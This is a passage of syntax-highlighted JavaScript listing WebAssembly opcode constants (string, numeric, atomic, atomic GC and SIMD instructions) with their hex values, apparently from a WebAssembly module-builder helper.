<span class="hljs-keyword">let</span> kExprStringNewWtf8 = <span class="hljs-number">0x8c</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeLossyUtf8 = <span class="hljs-number">0x8d</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeWtf8 = <span class="hljs-number">0x8e</span>;
<span class="hljs-keyword">let</span> kExprStringNewUtf8Try = <span class="hljs-number">0x8f</span>;
<span class="hljs-keyword">let</span> kExprStringAsWtf8 = <span class="hljs-number">0x90</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8Advance = <span class="hljs-number">0x91</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8EncodeUtf8 = <span class="hljs-number">0x92</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8Slice = <span class="hljs-number">0x93</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8EncodeLossyUtf8 = <span class="hljs-number">0x94</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8EncodeWtf8 = <span class="hljs-number">0x95</span>;
<span class="hljs-keyword">let</span> kExprStringAsWtf16 = <span class="hljs-number">0x98</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf16Length = <span class="hljs-number">0x99</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf16GetCodeunit = <span class="hljs-number">0x9a</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf16Encode = <span class="hljs-number">0x9b</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf16Slice = <span class="hljs-number">0x9c</span>;
<span class="hljs-keyword">let</span> kExprStringAsIter = <span class="hljs-number">0xa0</span>;
<span class="hljs-keyword">let</span> kExprStringViewIterNext = <span class="hljs-number">0xa1</span>
<span class="hljs-keyword">let</span> kExprStringViewIterAdvance = <span class="hljs-number">0xa2</span>;
<span class="hljs-keyword">let</span> kExprStringViewIterRewind = <span class="hljs-number">0xa3</span>
<span class="hljs-keyword">let</span> kExprStringViewIterSlice = <span class="hljs-number">0xa4</span>;
<span class="hljs-keyword">let</span> kExprStringCompare = <span class="hljs-number">0xa8</span>;
<span class="hljs-keyword">let</span> kExprStringFromCodePoint = <span class="hljs-number">0xa9</span>;
<span class="hljs-keyword">let</span> kExprStringHash = <span class="hljs-number">0xaa</span>;
<span class="hljs-keyword">let</span> kExprStringNewUtf8Array = <span class="hljs-number">0xb0</span>;
<span class="hljs-keyword">let</span> kExprStringNewWtf16Array = <span class="hljs-number">0xb1</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeUtf8Array = <span class="hljs-number">0xb2</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeWtf16Array = <span class="hljs-number">0xb3</span>;
<span class="hljs-keyword">let</span> kExprStringNewLossyUtf8Array = <span class="hljs-number">0xb4</span>;
<span class="hljs-keyword">let</span> kExprStringNewWtf8Array = <span class="hljs-number">0xb5</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeLossyUtf8Array = <span class="hljs-number">0xb6</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeWtf8Array = <span class="hljs-number">0xb7</span>;
<span class="hljs-keyword">let</span> kExprStringNewUtf8ArrayTry = <span class="hljs-number">0xb8</span>;

<span class="hljs-comment">// Numeric opcodes.</span>
<span class="hljs-keyword">let</span> kExprI32SConvertSatF32 = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kExprI32UConvertSatF32 = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kExprI32SConvertSatF64 = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kExprI32UConvertSatF64 = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kExprI64SConvertSatF32 = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kExprI64UConvertSatF32 = <span class="hljs-number">0x05</span>;
<span class="hljs-keyword">let</span> kExprI64SConvertSatF64 = <span class="hljs-number">0x06</span>;
<span class="hljs-keyword">let</span> kExprI64UConvertSatF64 = <span class="hljs-number">0x07</span>;
<span class="hljs-keyword">let</span> kExprMemoryInit = <span class="hljs-number">0x08</span>;
<span class="hljs-keyword">let</span> kExprDataDrop = <span class="hljs-number">0x09</span>;
<span class="hljs-keyword">let</span> kExprMemoryCopy = <span class="hljs-number">0x0a</span>;
<span class="hljs-keyword">let</span> kExprMemoryFill = <span class="hljs-number">0x0b</span>;
<span class="hljs-keyword">let</span> kExprTableInit = <span class="hljs-number">0x0c</span>;
<span class="hljs-keyword">let</span> kExprElemDrop = <span class="hljs-number">0x0d</span>;
<span class="hljs-keyword">let</span> kExprTableCopy = <span class="hljs-number">0x0e</span>;
<span class="hljs-keyword">let</span> kExprTableGrow = <span class="hljs-number">0x0f</span>;
<span class="hljs-keyword">let</span> kExprTableSize = <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kExprTableFill = <span class="hljs-number">0x11</span>;

<span class="hljs-comment">// Atomic opcodes.</span>
<span class="hljs-keyword">let</span> kExprAtomicNotify = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicWait = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicWait = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kExprAtomicFence = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicLoad = <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicLoad8U = <span class="hljs-number">0x12</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicLoad16U = <span class="hljs-number">0x13</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicStore = <span class="hljs-number">0x17</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicStore8U = <span class="hljs-number">0x19</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicStore16U = <span class="hljs-number">0x1a</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAdd = <span class="hljs-number">0x1e</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAdd8U = <span class="hljs-number">0x20</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAdd16U = <span class="hljs-number">0x21</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicSub = <span class="hljs-number">0x25</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicSub8U = <span class="hljs-number">0x27</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicSub16U = <span class="hljs-number">0x28</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAnd = <span class="hljs-number">0x2c</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAnd8U = <span class="hljs-number">0x2e</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicAnd16U = <span class="hljs-number">0x2f</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicOr = <span class="hljs-number">0x33</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicOr8U = <span class="hljs-number">0x35</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicOr16U = <span class="hljs-number">0x36</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicXor = <span class="hljs-number">0x3a</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicXor8U = <span class="hljs-number">0x3c</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicXor16U = <span class="hljs-number">0x3d</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicExchange = <span class="hljs-number">0x41</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicExchange8U = <span class="hljs-number">0x43</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicExchange16U = <span class="hljs-number">0x44</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicCompareExchange = <span class="hljs-number">0x48</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicCompareExchange8U = <span class="hljs-number">0x4a</span>;
<span class="hljs-keyword">let</span> kExprI32AtomicCompareExchange16U = <span class="hljs-number">0x4b</span>;

<span class="hljs-keyword">let</span> kExprI64AtomicLoad = <span class="hljs-number">0x11</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicLoad8U = <span class="hljs-number">0x14</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicLoad16U = <span class="hljs-number">0x15</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicLoad32U = <span class="hljs-number">0x16</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicStore = <span class="hljs-number">0x18</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicStore8U = <span class="hljs-number">0x1b</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicStore16U = <span class="hljs-number">0x1c</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicStore32U = <span class="hljs-number">0x1d</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAdd = <span class="hljs-number">0x1f</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAdd8U = <span class="hljs-number">0x22</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAdd16U = <span class="hljs-number">0x23</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAdd32U = <span class="hljs-number">0x24</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicSub = <span class="hljs-number">0x26</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicSub8U = <span class="hljs-number">0x29</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicSub16U = <span class="hljs-number">0x2a</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicSub32U = <span class="hljs-number">0x2b</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAnd = <span class="hljs-number">0x2d</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAnd8U = <span class="hljs-number">0x30</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAnd16U = <span class="hljs-number">0x31</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicAnd32U = <span class="hljs-number">0x32</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicOr = <span class="hljs-number">0x34</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicOr8U = <span class="hljs-number">0x37</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicOr16U = <span class="hljs-number">0x38</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicOr32U = <span class="hljs-number">0x39</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicXor = <span class="hljs-number">0x3b</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicXor8U = <span class="hljs-number">0x3e</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicXor16U = <span class="hljs-number">0x3f</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicXor32U = <span class="hljs-number">0x40</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicExchange = <span class="hljs-number">0x42</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicExchange8U = <span class="hljs-number">0x45</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicExchange16U = <span class="hljs-number">0x46</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicExchange32U = <span class="hljs-number">0x47</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicCompareExchange = <span class="hljs-number">0x49</span>
<span class="hljs-keyword">let</span> kExprI64AtomicCompareExchange8U = <span class="hljs-number">0x4c</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicCompareExchange16U = <span class="hljs-number">0x4d</span>;
<span class="hljs-keyword">let</span> kExprI64AtomicCompareExchange32U = <span class="hljs-number">0x4e</span>;

<span class="hljs-comment">// Atomic GC opcodes (shared-everything-threads).</span>
<span class="hljs-keyword">const</span> kExprPause = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicGet = <span class="hljs-number">0x5c</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicGetS = <span class="hljs-number">0x5d</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicGetU = <span class="hljs-number">0x5e</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicSet = <span class="hljs-number">0x5f</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicAdd = <span class="hljs-number">0x60</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicSub = <span class="hljs-number">0x61</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicAnd = <span class="hljs-number">0x62</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicOr = <span class="hljs-number">0x63</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicXor = <span class="hljs-number">0x64</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicExchange = <span class="hljs-number">0x65</span>;
<span class="hljs-keyword">const</span> kExprStructAtomicCompareExchange = <span class="hljs-number">0x66</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicGet = <span class="hljs-number">0x67</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicGetS = <span class="hljs-number">0x68</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicGetU = <span class="hljs-number">0x69</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicSet = <span class="hljs-number">0x6a</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicAdd = <span class="hljs-number">0x6b</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicSub = <span class="hljs-number">0x6c</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicAnd = <span class="hljs-number">0x6d</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicOr = <span class="hljs-number">0x6e</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicXor = <span class="hljs-number">0x6f</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicExchange = <span class="hljs-number">0x70</span>;
<span class="hljs-keyword">const</span> kExprArrayAtomicCompareExchange = <span class="hljs-number">0x71</span>;

<span class="hljs-comment">// Simd opcodes.</span>
<span class="hljs-keyword">let</span> kExprS128LoadMem = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kExprS128Load8x8S = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kExprS128Load8x8U = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kExprS128Load16x4S = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kExprS128Load16x4U = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kExprS128Load32x2S = <span class="hljs-number">0x05</span>;
<span class="hljs-keyword">let</span> kExprS128Load32x2U = <span class="hljs-number">0x06</span>;
<span class="hljs-keyword">let</span> kExprS128Load8Splat = <span class="hljs-number">0x07</span>;
<span class="hljs-keyword">let</span> kExprS128Load16Splat = <span class="hljs-number">0x08</span>;
<span class="hljs-keyword">let</span> kExprS128Load32Splat = <span class="hljs-number">0x09</span>;
<span class="hljs-keyword">let</span> kExprS128Load64Splat = <span class="hljs-number">0x0a</span>;
<span class="hljs-keyword">let</span> kExprS128StoreMem = <span class="hljs-number">0x0b</span>;
<span class="hljs-keyword">let</span> kExprS128Const = <span class="hljs-number">0x0c</span>;
<span class="hljs-keyword">let</span> kExprI8x16Shuffle = <span class="hljs-number">0x0d</span>;
<span class="hljs-keyword">let</span> kExprI8x16Swizzle = <span class="hljs-number">0x0e</span>;

<span class="hljs-keyword">let</span> kExprI8x16Splat = <span class="hljs-number">0x0f</span>;
<span class="hljs-keyword">let</span> kExprI16x8Splat = <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kExprI32x4Splat = <span class="hljs-number">0x11</span>;
<span class="hljs-keyword">let</span> kExprI64x2Splat = <span class="hljs-number">0x12</span>;
<span class="hljs-keyword">let</span> kExprF32x4Splat = <span class="hljs-number">0x13</span>;
<span class="hljs-keyword">let</span> kExprF64x2Splat = <span class="hljs-number">0x14</span>;
<span class="hljs-keyword">let</span> kExprI8x16ExtractLaneS = <span class="hljs-number">0x15</span>;
<span class="hljs-keyword">let</span> kExprI8x16ExtractLaneU = <span class="hljs-number">0x16</span>;
<span class="hljs-keyword">let</span> kExprI8x16ReplaceLane = <span class="hljs-number">0x17</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtractLaneS = <span class="hljs-number">0x18</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtractLaneU = <span class="hljs-number">0x19</span>;
<span class="hljs-keyword">let</span> kExprI16x8ReplaceLane = <span class="hljs-number">0x1a</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtractLane = <span class="hljs-number">0x1b</span>;
<span class="hljs-keyword">let</span> kExprI32x4ReplaceLane = <span class="hljs-number">0x1c</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtractLane = <span class="hljs-number">0x1d</span>;
<span class="hljs-keyword">let</span> kExprI64x2ReplaceLane = <span class="hljs-number">0x1e</span>;
<span class="hljs-keyword">let</span> kExprF32x4ExtractLane = <span class="hljs-number">0x1f</span>;
<span class="hljs-keyword">let</span> kExprF32x4ReplaceLane = <span class="hljs-number">0x20</span>;
<span class="hljs-keyword">let</span> kExprF64x2ExtractLane = <span class="hljs-number">0x21</span>;
<span class="hljs-keyword">let</span> kExprF64x2ReplaceLane = <span class="hljs-number">0x22</span>;
<span class="hljs-keyword">let</span> kExprI8x16Eq = <span class="hljs-number">0x23</span>;
<span class="hljs-keyword">let</span> kExprI8x16Ne = <span class="hljs-number">0x24</span>;
<span class="hljs-keyword">let</span> kExprI8x16LtS = <span class="hljs-number">0x25</span>;
<span class="hljs-keyword">let</span> kExprI8x16LtU = <span class="hljs-number">0x26</span>;
<span class="hljs-keyword">let</span> kExprI8x16GtS = <span class="hljs-number">0x27</span>;
<span class="hljs-keyword">let</span> kExprI8x16GtU = <span class="hljs-number">0x28</span>;
<span class="hljs-keyword">let</span> kExprI8x16LeS = <span class="hljs-number">0x29</span>;
<span class="hljs-keyword">let</span> kExprI8x16LeU = <span class="hljs-number">0x2a</span>;
<span class="hljs-keyword">let</span> kExprI8x16GeS = <span class="hljs-number">0x2b</span>;
<span class="hljs-keyword">let</span> kExprI8x16GeU = <span class="hljs-number">0x2c</span>;
<span class="hljs-keyword">let</span> kExprI16x8Eq = <span class="hljs-number">0x2d</span>;
<span class="hljs-keyword">let</span> kExprI16x8Ne = <span class="hljs-number">0x2e</span>;
<span class="hljs-keyword">let</span> kExprI16x8LtS = <span class="hljs-number">0x2f</span>;
<span class="hljs-keyword">let</span> kExprI16x8LtU = <span class="hljs-number">0x30</span>;
<span class="hljs-keyword">let</span> kExprI16x8GtS = <span class="hljs-number">0x31</span>;
<span class="hljs-keyword">let</span> kExprI16x8GtU = <span class="hljs-number">0x32</span>;
<span class="hljs-keyword">let</span> kExprI16x8LeS = <span class="hljs-number">0x33</span>;
<span class="hljs-keyword">let</span> kExprI16x8LeU = <span class="hljs-number">0x34</span>;
<span class="hljs-keyword">let</span> kExprI16x8GeS = <span class="hljs-number">0x35</span>;
<span class="hljs-keyword">let</span> kExprI16x8GeU = <span class="hljs-number">0x36</span>;
<span class="hljs-keyword">let</span> kExprI32x4Eq = <span class="hljs-number">0x37</span>;
<span class="hljs-keyword">let</span> kExprI32x4Ne = <span class="hljs-number">0x38</span>;
<span class="hljs-keyword">let</span> kExprI32x4LtS = <span class="hljs-number">0x39</span>;
<span class="hljs-keyword">let</span> kExprI32x4LtU = <span class="hljs-number">0x3a</span>;
<span class="hljs-keyword">let</span> kExprI32x4GtS = <span class="hljs-number">0x3b</span>;
<span class="hljs-keyword">let</span> kExprI32x4GtU = <span class="hljs-number">0x3c</span>;
<span class="hljs-keyword">let</span> kExprI32x4LeS = <span class="hljs-number">0x3d</span>;
<span class="hljs-keyword">let</span> kExprI32x4LeU = <span class="hljs-number">0x3e</span>;
<span class="hljs-keyword">let</span> kExprI32x4GeS = <span class="hljs-number">0x3f</span>;
<span class="hljs-keyword">let</span> kExprI32x4GeU = <span class="hljs-number">0x40</span>;
<span class="hljs-keyword">let</span> kExprF32x4Eq = <span class="hljs-number">0x41</span>;
<span class="hljs-keyword">let</span> kExprF32x4Ne = <span class="hljs-number">0x42</span>;
<span class="hljs-keyword">let</span> kExprF32x4Lt = <span class="hljs-number">0x43</span>;
<span class="hljs-keyword">let</span> kExprF32x4Gt = <span class="hljs-number">0x44</span>;
<span class="hljs-keyword">let</span> kExprF32x4Le = <span class="hljs-number">0x45</span>;
<span class="hljs-keyword">let</span> kExprF32x4Ge = <span class="hljs-number">0x46</span>;
<span class="hljs-keyword">let</span> kExprF64x2Eq = <span class="hljs-number">0x47</span>;
<span class="hljs-keyword">let</span> kExprF64x2Ne = <span class="hljs-number">0x48</span>;
<span class="hljs-keyword">let</span> kExprF64x2Lt = <span class="hljs-number">0x49</span>;
<span class="hljs-keyword">let</span> kExprF64x2Gt = <span class="hljs-number">0x4a</span>;
<span class="hljs-keyword">let</span> kExprF64x2Le = <span class="hljs-number">0x4b</span>;
<span class="hljs-keyword">let</span> kExprF64x2Ge = <span class="hljs-number">0x4c</span>;
<span class="hljs-keyword">let</span> kExprS128Not = <span class="hljs-number">0x4d</span>;
<span class="hljs-keyword">let</span> kExprS128And = <span class="hljs-number">0x4e</span>;
<span class="hljs-keyword">let</span> kExprS128AndNot = <span class="hljs-number">0x4f</span>;
<span class="hljs-keyword">let</span> kExprS128Or = <span class="hljs-number">0x50</span>;
<span class="hljs-keyword">let</span> kExprS128Xor = <span class="hljs-number">0x51</span>;
<span class="hljs-keyword">let</span> kExprS128Select = <span class="hljs-number">0x52</span>;
<span class="hljs-keyword">let</span> kExprV128AnyTrue = <span class="hljs-number">0x53</span>;
<span class="hljs-keyword">let</span> kExprS128Load8Lane = <span class="hljs-number">0x54</span>;
<span class="hljs-keyword">let</span> kExprS128Load16Lane = <span class="hljs-number">0x55</span>;
<span class="hljs-keyword">let</span> kExprS128Load32Lane = <span class="hljs-number">0x56</span>;
<span class="hljs-keyword">let</span> kExprS128Load64Lane = <span class="hljs-number">0x57</span>;
<span class="hljs-keyword">let</span> kExprS128Store8Lane = <span class="hljs-number">0x58</span>;
<span class="hljs-keyword">let</span> kExprS128Store16Lane = <span class="hljs-number">0x59</span>;
<span class="hljs-keyword">let</span> kExprS128Store32Lane = <span class="hljs-number">0x5a</span>;
<span class="hljs-keyword">let</span> kExprS128Store64Lane = <span class="hljs-number">0x5b</span>;
<span class="hljs-keyword">let</span> kExprS128Load32Zero = <span class="hljs-number">0x5c</span>;
<span class="hljs-keyword">let</span> kExprS128Load64Zero = <span class="hljs-number">0x5d</span>;
<span class="hljs-keyword">let</span> kExprF32x4DemoteF64x2Zero = <span class="hljs-number">0x5e</span>;
<span class="hljs-keyword">let</span> kExprF64x2PromoteLowF32x4 = <span class="hljs-number">0x5f</span>;
<span class="hljs-keyword">let</span> kExprI8x16Abs = <span class="hljs-number">0x60</span>;
<span class="hljs-keyword">let</span> kExprI8x16Neg = <span class="hljs-number">0x61</span>;
<span class="hljs-keyword">let</span> kExprI8x16Popcnt = <span class="hljs-number">0x62</span>;
<span class="hljs-keyword">let</span> kExprI8x16AllTrue = <span class="hljs-number">0x63</span>;
<span class="hljs-keyword">let</span> kExprI8x16BitMask = <span class="hljs-number">0x64</span>;
<span class="hljs-keyword">let</span> kExprI8x16SConvertI16x8 = <span class="hljs-number">0x65</span>;
<span class="hljs-keyword">let</span> kExprI8x16UConvertI16x8 = <span class="hljs-number">0x66</span>;
<span class="hljs-keyword">let</span> kExprF32x4Ceil = <span class="hljs-number">0x67</span>;
<span class="hljs-keyword">let</span> kExprF32x4Floor = <span class="hljs-number">0x68</span>;
<span class="hljs-keyword">let</span> kExprF32x4Trunc = <span class="hljs-number">0x69</span>;
<span class="hljs-keyword">let</span> kExprF32x4NearestInt = <span class="hljs-number">0x6a</span>;
<span class="hljs-keyword">let</span> kExprI8x16Shl = <span class="hljs-number">0x6b</span>;
<span class="hljs-keyword">let</span> kExprI8x16ShrS = <span class="hljs-number">0x6c</span>;
<span class="hljs-keyword">let</span> kExprI8x16ShrU = <span class="hljs-number">0x6d</span>;
<span class="hljs-keyword">let</span> kExprI8x16Add = <span class="hljs-number">0x6e</span>;
<span class="hljs-keyword">let</span> kExprI8x16AddSatS = <span class="hljs-number">0x6f</span>;
<span class="hljs-keyword">let</span> kExprI8x16AddSatU = <span class="hljs-number">0x70</span>;
<span class="hljs-keyword">let</span> kExprI8x16Sub = <span class="hljs-number">0x71</span>;
<span class="hljs-keyword">let</span> kExprI8x16SubSatS = <span class="hljs-number">0x72</span>;
<span class="hljs-keyword">let</span> kExprI8x16SubSatU = <span class="hljs-number">0x73</span>;
<span class="hljs-keyword">let</span> kExprF64x2Ceil = <span class="hljs-number">0x74</span>;
<span class="hljs-keyword">let</span> kExprF64x2Floor = <span class="hljs-number">0x75</span>;
<span class="hljs-keyword">let</span> kExprI8x16MinS = <span class="hljs-number">0x76</span>;
<span class="hljs-keyword">let</span> kExprI8x16MinU = <span class="hljs-number">0x77</span>;
<span class="hljs-keyword">let</span> kExprI8x16MaxS = <span class="hljs-number">0x78</span>;
<span class="hljs-keyword">let</span> kExprI8x16MaxU = <span class="hljs-number">0x79</span>;
<span class="hljs-keyword">let</span> kExprF64x2Trunc = <span class="hljs-number">0x7a</span>;
<span class="hljs-keyword">let</span> kExprI8x16RoundingAverageU = <span class="hljs-number">0x7b</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtAddPairwiseI8x16S = <span class="hljs-number">0x7c</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtAddPairwiseI8x16U = <span class="hljs-number">0x7d</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtAddPairwiseI16x8S = <span class="hljs-number">0x7e</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtAddPairwiseI16x8U = <span class="hljs-number">0x7f</span>;
<span class="hljs-keyword">let</span> kExprI16x8Abs = <span class="hljs-number">0x80</span>;
<span class="hljs-keyword">let</span> kExprI16x8Neg = <span class="hljs-number">0x81</span>;
<span class="hljs-keyword">let</span> kExprI16x8Q15MulRSatS = <span class="hljs-number">0x82</span>;
<span class="hljs-keyword">let</span> kExprI16x8AllTrue = <span class="hljs-number">0x83</span>;
<span class="hljs-keyword">let</span> kExprI16x8BitMask = <span class="hljs-number">0x84</span>;
<span class="hljs-keyword">let</span> kExprI16x8SConvertI32x4 = <span class="hljs-number">0x85</span>;
<span class="hljs-keyword">let</span> kExprI16x8UConvertI32x4 = <span class="hljs-number">0x86</span>;
<span class="hljs-keyword">let</span> kExprI16x8SConvertI8x16Low = <span class="hljs-number">0x87</span>;
<span class="hljs-keyword">let</span> kExprI16x8SConvertI8x16High = <span class="hljs-number">0x88</span>;
<span class="hljs-keyword">let</span> kExprI16x8UConvertI8x16Low = <span class="hljs-number">0x89</span>;
<span class="hljs-keyword">let</span> kExprI16x8UConvertI8x16High = <span class="hljs-number">0x8a</span>;
<span class="hljs-keyword">let</span> kExprI16x8Shl = <span class="hljs-number">0x8b</span>;
<span class="hljs-keyword">let</span> kExprI16x8ShrS = <span class="hljs-number">0x8c</span>;
<span class="hljs-keyword">let</span> kExprI16x8ShrU = <span class="hljs-number">0x8d</span>;
<span class="hljs-keyword">let</span> kExprI16x8Add = <span class="hljs-number">0x8e</span>;
<span class="hljs-keyword">let</span> kExprI16x8AddSatS = <span class="hljs-number">0x8f</span>;
<span class="hljs-keyword">let</span> kExprI16x8AddSatU = <span class="hljs-number">0x90</span>;
<span class="hljs-keyword">let</span> kExprI16x8Sub = <span class="hljs-number">0x91</span>;
<span class="hljs-keyword">let</span> kExprI16x8SubSatS = <span class="hljs-number">0x92</span>;
<span class="hljs-keyword">let</span> kExprI16x8SubSatU = <span class="hljs-number">0x93</span>;
<span class="hljs-keyword">let</span> kExprF64x2NearestInt = <span class="hljs-number">0x94</span>;
<span class="hljs-keyword">let</span> kExprI16x8Mul = <span class="hljs-number">0x95</span>;
<span class="hljs-keyword">let</span> kExprI16x8MinS = <span class="hljs-number">0x96</span>;
<span class="hljs-keyword">let</span> kExprI16x8MinU = <span class="hljs-number">0x97</span>;
<span class="hljs-keyword">let</span> kExprI16x8MaxS = <span class="hljs-number">0x98</span>;
<span class="hljs-keyword">let</span> kExprI16x8MaxU = <span class="hljs-number">0x99</span>;
<span class="hljs-keyword">let</span> kExprI16x8RoundingAverageU = <span class="hljs-number">0x9b</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtMulLowI8x16S = <span class="hljs-number">0x9c</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtMulHighI8x16S = <span class="hljs-number">0x9d</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtMulLowI8x16U = <span class="hljs-number">0x9e</span>;
<span class="hljs-keyword">let</span> kExprI16x8ExtMulHighI8x16U = <span class="hljs-number">0x9f</span>;
<span class="hljs-keyword">let</span> kExprI32x4Abs = <span class="hljs-number">0xa0</span>;
<span class="hljs-keyword">let</span> kExprI32x4Neg = <span class="hljs-number">0xa1</span>;
<span class="hljs-keyword">let</span> kExprI32x4AllTrue = <span class="hljs-number">0xa3</span>;
<span class="hljs-keyword">let</span> kExprI32x4BitMask = <span class="hljs-number">0xa4</span>;
<span class="hljs-keyword">let</span> kExprI32x4SConvertI16x8Low = <span class="hljs-number">0xa7</span>;
<span class="hljs-keyword">let</span> kExprI32x4SConvertI16x8High = <span class="hljs-number">0xa8</span>;
<span class="hljs-keyword">let</span> kExprI32x4UConvertI16x8Low = <span class="hljs-number">0xa9</span>;
<span class="hljs-keyword">let</span> kExprI32x4UConvertI16x8High = <span class="hljs-number">0xaa</span>;
<span class="hljs-keyword">let</span> kExprI32x4Shl = <span class="hljs-number">0xab</span>;
<span class="hljs-keyword">let</span> kExprI32x4ShrS = <span class="hljs-number">0xac</span>;
<span class="hljs-keyword">let</span> kExprI32x4ShrU = <span class="hljs-number">0xad</span>;
<span class="hljs-keyword">let</span> kExprI32x4Add = <span class="hljs-number">0xae</span>;
<span class="hljs-keyword">let</span> kExprI32x4Sub = <span class="hljs-number">0xb1</span>;
